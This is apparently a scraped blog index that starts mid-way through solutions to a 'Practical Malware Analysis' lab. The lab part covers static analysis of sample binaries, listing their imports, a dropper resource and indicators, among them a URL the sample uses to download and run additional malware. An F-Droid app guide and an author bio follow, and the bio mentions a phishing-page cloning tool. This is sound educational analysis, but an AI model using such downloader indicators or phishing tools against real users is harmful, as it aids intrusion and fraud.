Unpacked 0 files. Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you? Being still packed, we have limited visibility on Lab01–03.exe. We can only see that it imports KERNEL32.DLL and uses the following functions: LoadLibraryA and GetProcAddress.\n$ readpe -i Lab01-03.exe Imported functions Library Name: KERNEL32.dll Functions Function Hint: 0 Name: LoadLibraryA Function Hint: 0 Name: GetProcAddress What host or network-based indicators could be used to identify this malware on infected machines? In this case, strings does not help us a lot, because the file is packed. Again we see LoadLibraryA and GetProcAddress. Some of the other strings seems to refer to OLE.\nLab 1-4 Upload the Lab01-04.exe file to VirusTotal. Does it match any existing antivirus definitions? The file is detected as malicious by 61 engines, here is the report.\nAre there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible. The file does not seem to be packed:\n$ diec Lab01-04.exe PE: compiler: Microsoft Visual C/C++(6.0)[msvcrt] PE: linker: Microsoft Linker(6.0*)[EXE32] When was this program compiled? The time stamp reported seems suspicious 🤔, considering that the book was published in 2012:\n$ readpe Lab01-04.exe | grep \u0026#34;time stamp\u0026#34; Date/time stamp: 1567204019 (Fri, 30 Aug 2019 22:26:59 UTC) It was probably modified, thus it\u0026rsquo;s not clear when the file was actually compiled.\nDo any imports hint at this program’s functionality? If so, which imports are they and what do they tell you? Here are the imports found with readpe -i:\nADVAPI32.dll: AdjustTokenPrivileges, LookupPrivilegeValueA and OpenProcessToken. KERNEL32.dll: CreateRemoteThread, MoveFileA, SizeofResource, LoadResource, GetModuleHandleA, OpenProcess, GetWindowsDirectoryA, WriteFile, GetCurrentProcess, CreateFileA, GetProcAddress, FindResourceA, LoadLibraryA and WinExec. Considering the functions used, we can say that the program will try to access protected files (SizeOfResource, FindResource, LoadResource, LookupPrivilegeValueA and AdjustTokenPrivilages) and create and execute files (CreateFile, WriteFile and WinExec).\nWhat host or network-based indicators could be used to identify this malware on infected machines? Here are the host and network-based indicators that can be found using strings:\nhost-based: C:\\WINDOWS\\system32\\wupdmgrd.exe and winup.exe network-based: http://www.practicalmalwareanalysis.com/updater.exe This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource? We can list and extract the resources from a Windows binary using wrestool:\n$ wrestool -l Lab01-04.exe --type=\u0026#39;BIN\u0026#39; --name=101 --language=1033 [offset=0x4060 size=16384] $ wrestool -x --raw --output=Lab01-04.bin Lab01-04.exe VirusTotal report Not packed: $ diec Lab01-04.bin PE: compiler: Microsoft Visual C/C++(6.0)[msvcrt] PE: linker: Microsoft Linker(6.0)[EXE32] Compiled on 1298765819 (Sun, 27 Feb 2011 00:16:59 UTC). Imports: KERNEl32.dll (WinExec) and urlmon.dll (URLDownloadToFileA) Interesting strings: \\system32\\wupdmgr.exe, winup.exe and www.malwareanalysisbok.com/updater.exe Considering the information obtained, we can assume that the Lab01-04.exe file will be used to change permissions to write in a directory and drop and execute the hidden resource, which contacts the network to download and run additional malware.\n","permalink":"https://andpalmier.com/posts/practical-malware-lab1/","summary":"Solutions for the first lab of \u0026lsquo;Practical malware analysis\u0026rsquo;","title":"Practical malware analysis: solutions for Lab 1"},{"content":" What is F-Droid? F-Droid is a community-maintained software repository for Android devices; or - to make it simpler - an alternative store for Android apps. Similarly to the Google Play Store, F-Droid allows searching, installing and updating apps. What makes F-Droid different from the Google Play Store (and other alternative stores, such as Aptoide) is the fact that its entire list of applications is FOSS (Free and Open Source Software), meaning that the source code of the apps is available online, and can be inspected by everyone.\nWhy use F-Droid? There are different advantages of using F-Droid. On the privacy side, F-Droid allows the user to download, install and update applications without being registered to the store. In addition, every app on F-Droid has to have the so-called ‘anti-features’:\nNo user tracking systems; No advertising; No dependence on non-free software: everyone can download, run, and use all the features of the application On the security side, its open-source license allows everyone to check the source code of every app before downloading it. In addition, F-Droid sends all the information over HTTPS by default, and, if Orbot is installed on the device, it can even force the traffic to go through Tor.\nIf you are interested in the building and signing process of the apps, you can find some details in the FAQ section on f-droid.org or in the documentation about the security model.\nHow to install F-Droid? Due to its FOSS nature, F-Droid cannot be found in the Google Play store. This means that it has to be downloaded and installed manually. You can find the app on the f-droid website, but, in order to install it, you should allow your browser to \u0026lsquo;install apps from unknown sources\u0026rsquo; directly from the Android settings. This should also be enabled for F-Droid itself, in order to download and install apps from it.\nA suggestion: disable this special permission for your browser as soon as the F-Droid installation is completed, because it creates a security risk for your device.\nMy favorite FOSS apps Here is a list of my favorite FOSS Android apps. Keep in mind that some of them can be found also on the Google Play store.\nName Google Play? Category Description Source code AdAway No Adblocker Lightweight adblocker for your phone. It can work without root permissions. GitHub Aegis Yes 2FA token Free, easy and secure app to manage 2-step verification tokens. GitHub AntennaPod Yes Podcast Download, stream or queue episodes with tons of features. Millions of free and paid podcasts available. GitHub Birday No Birthdays reminder A simple yet useful birthday manager. Birday is free and ad-free! GitHub Bitwarden Yes Password manager Easy password manager solution which can be self-hosted and can generate 2FA tokens. GitHub Bromite No Browser Chromium fork with ad blocking and enhanced privacy. GitHub Catima Yes Wallet For barcodes, memberships, loyalty programs, coupons and tickets. GitHub Download Navi Yes Download manager Easy to use download manager for your phone. GitHub Gadgetbridge No Wearables Communicate with wearables without giving your privacy away. Many features available depending on the device. Codeberg Infinity Yes Reddit Beautiful, feature-rich app that offers a smooth Reddit browsing experience. GitHub KISS Yes Launcher Easy to use and extremely lightweight Android launcher. GitHub Loop Habit Tracker Yes Habit tracker Helps you create and maintain good habits, allowing you to achieve your long-term goals. GitHub Material Files Yes File manager A Material Design file manager, for Android 5.0+. GitHub Medito Yes Meditation Meditation app that includes guided meditations, breathing exercises, mindfulness practices, relaxing sounds, and more. GitHub Mull No Browser This is a fork of Firefox without proprietary blobs. Addons available. GitLab NewPipe No YouTube (\u0026amp; more) Youtube client that allows audio only playback in background and download. No Google account needed. GitHub Tusky Yes Mastodon Lightweight and feature-rich client for Mastodon. GitHub Voice Yes Audiobooks Audiobook player which remembers last position, has bookmarks, Android Auto compatibility and Sleep-timer. GitHub WireGuard Yes VPN The official app for managing WireGuard VPN tunnels. Git Conclusion This is only a brief introduction to the F-Droid world. Next time you are looking for an app, remember to check first if a FOSS alternative exists. Even if you don\u0026rsquo;t want to install the F-Droid client, maybe you could find it on the Play Store: you will receive in return less ads on your phone and a more privacy friendly experience.\nBefore installing the app, always check when was the last update. Outdated apps may expose you to security issues (this is a suggestion that applies also when installing apps from the Play Store).\nSources If you are interested in this topic, you can check:\nfdroid.org r/fdroid on Reddit r/fossdroid on Reddit fossdroid.com ","permalink":"https://andpalmier.com/posts/fdroid-apps/","summary":"Discussing the F-Droid apps I use everyday","title":"F-Droid apps you will find useful"},{"content":"My name is Andrea Palmieri. I am interested in everything cyber-security related, machine learning, and reverse engineering. I am passionate about books, movies and art in general. Also, I am a die-hard AS Roma fan.\nHere is a non-updated version of my resume. For a more recent version, you can send me an email at andpalmier [at] gmail [dot] com or contact me on LinkedIn.\nProjects You can find my projects on GitHub, here are some of the most interesting ones:\napkingo: get detailed information about apk files. GitHub. makephish: clone and patch websites to create phishing pages. GitHub and a spanish article about it. phishflood: flood phishing kits with fake data. Blog post and GitHub. mlWithPhishing: tuning machine learning models for phishing detection. Blog posts and GitHub. MQTTSA: detect misconfigurations in MQTT brokers and suggest mitigations. IEEEXplore, GitHub and website. ","permalink":"https://andpalmier.com/about/","summary":"My name is Andrea Palmieri. I am interested in everything cyber-security related, machine learning, and reverse engineering. I am passionate about books, movies and art in general. Also, I am a die-hard AS Roma fan.\nHere is a non-updated version of my resume. For a more recent version, you can send me an email at andpalmier [at] gmail [dot] com or contact me on LinkedIn.\nProjects You can find my projects on GitHub, here are some of the most interesting ones:","title":"Hey 👋"}]